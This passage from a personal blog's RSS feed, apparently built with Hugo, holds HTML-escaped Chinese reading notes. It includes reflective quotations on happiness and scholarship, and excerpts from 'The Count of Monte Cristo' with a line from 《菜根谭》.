&lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我突然感到自己不够坦诚。看问题也是这样，不是没有缺点的，问题是自己也要坦诚，不能自己都是优点，别人都是缺点。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人，必须活得有自尊和骄傲。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;没有幸福的欲望，也就没有痛苦。痛苦往往是伴随着对幸福的追求的，而不是伴随着幸福本身。所以要怀疑的不是幸福本身，而是每个人主观状态中的希望。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;幸福之事，可欲而不可求，可求而不可执。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;这句话来自王教授的学生：&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人们看待一个有道德的人，透出的目光是亲切，看待一个有权力的人，透出的目光是敬畏，只有看待一个有知识的人，目光中才盈溢着无限的尊重，并饱含着由衷的敬佩。我向往那份尊重和敬佩。再有，我很欣赏书页中那一片于喧闹、复杂和浮噪之中仍可守的宁静的小天地。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;要注意确立自己在历史中的方位，这样才能更加深入地研究问题。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;学问之事，全在贡献于社会，清淡出自身，并不在乎别人如何说。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;“太阳都有人觉得他刺眼。总想让每一个人都满意，总害怕出现一点错误，这是幼稚的”。&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在探索真理的过程中，最难的是否定自己所有的创见，不管他们曾给你带来什么荣誉，同时追求新的创见，不管它们会让你失去什么。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;快乐也好，害怕也好，生命总是要流失。要在生命流失的过程中，尽量地实现自己的理想和意志，完成人的选择，这将是有价值的生命。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>《基督山伯爵》</title>
      <link>http://localhost:1313/posts/read_jdsbj/</link>
      <pubDate>Tue, 13 Jan 2026 00:25:03 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_jdsbj/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;学过的东西，不一定是懂得的东西。有两种人，一种是书蠹，一种是学者：记忆造就前一种人，哲学造就后一种人&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个让人见了就伤心的人，你哪怕心肠再好，也不会总是去看他的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;“大家都喜欢正面的事情，负面的情绪，事件都会影响到自己，从而发现，自己的抱怨越来越多人懒得理，没人有空听你的事情。每个人都有生活上的不易，比你不易的，觉得你庸人自扰抱怨唉声叹气很没必要；比你稍微好一点的，感叹完你的不易之后会开始不理解你为什么不走出来，害怕你的难过，从而躲得远远的。要是以此认为世界，别人都很冷漠，确实，世界很冷漠，但不对的是，不要去憎恨责怪他人对你的无情，因为你本人也一样”&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们常常同快乐擦身而过，却对它视而不见；即使我们看到它而且注意到了它，可还是认不出它&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;时间和沉默，是治疗精神创伤的两帖药。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;自知要比知人难得多，而知人要比自知有用得多。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;然而，无论这份恩惠怎么珍贵，它还是没法跟我内心的满足相比的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;《菜根谭》：“施恩者，内不见己，外不见人，则斗粟可当万钟之惠；利物者，计己之施，责人之报，虽百镒难成一文之功”。译文：施恩惠给别人的人，不可以将这种恩惠记在心上，更不应该存着让别人赞美的念头，这样即使是向别人布施了一斗米，也可以收到千万石米的回报；用财物帮助别人的人，如果总计较自己对别人的施舍，而且要求别人报答，这样即使是付出了一百镒，也难收到一文钱的功德。&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;从总体上来研究人类，而您研究的是个体，每天接触的都是个案。我想，从整体到局部，要比从局部到整体容易得多。有一条代数公理告诉我们，应该由已知数来求未知数，而不该由未知数来求已知数……&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;您只看见机器在运转，而没看见驱使它运转的那位了不起的机械师。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我只有两个对手——是对手而不是征服者，因为凭我的坚忍，它们最终会向我屈服——那就是距离和时间。第三个对手是最可怕的，那就是凡人都难免的一死。只有死亡才能在我达到既定目标之前，使我停在前进的路上。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;难道太阳为我做过什么事了吗？没有。它温暖了我，让我在阳光中见到了您，如此而已。难道花的香味为我做过什么事了吗？没有。但这香味唤起了我某种愉悦的感觉。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;最奇妙的东西是什么呢？是我们无法懂得的东西。我们内心所向往的，又是什么东西呢？是我们无法拥有的东西。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们的自私，往往会给属于自己的东西蒙上一层耀眼的光彩。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;您只要把随便哪个国家的一个人研究透了，也就把这个种族完全弄明白了，道理是一样的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;生活中的许多事情都是碰运气的，所以幸福到了手边，就得一把抓住。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;这世界的一大不幸就是每人都有自己的看法，而正是这种看法妨碍了我们去看清别人的看法&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人有了信仰，就可以移动大山&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人看到的景象是随心境而变的；您的心境很阴郁，所以您看到的是个彤云密布的天空。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;这就是人性中一种可怜的骄傲，每个人总以为自己比身边另一个在哭泣、呻吟的不幸的人更加不幸。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的幸福都是过眼云烟&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;这个世界上无所谓幸福，也无所谓不幸，有的只是一种境况和另一种境况的比较，如此而已。只有体验过极度不幸的人，才能品尝到极度的幸福。只有下过死的决心的人，马克西米利安，才会知道活着有多好。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;让人见你自重，你就会被看重。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;瘦弱的人爱说自己能挑重担，胆怯的人爱说怎么迎战巨人，穷人会夸口有金银财宝，就连最卑微的农夫，自吹自擂时也会自称是朱庇特。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;您希望别人的自尊心对您作出让步，您就得先顾及对方的自尊心，保全他的面子，不让他为难。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;死亡是什么？就是向安宁走近一步，就是向寂静走近也许两步。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一位法兰西学院院士说过，社交场上的晚会就好比花展，吸引着用情不专的蝴蝶、饥饿贪婪的蜜蜂和嗡嗡嘤嘤的大胡蜂。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div 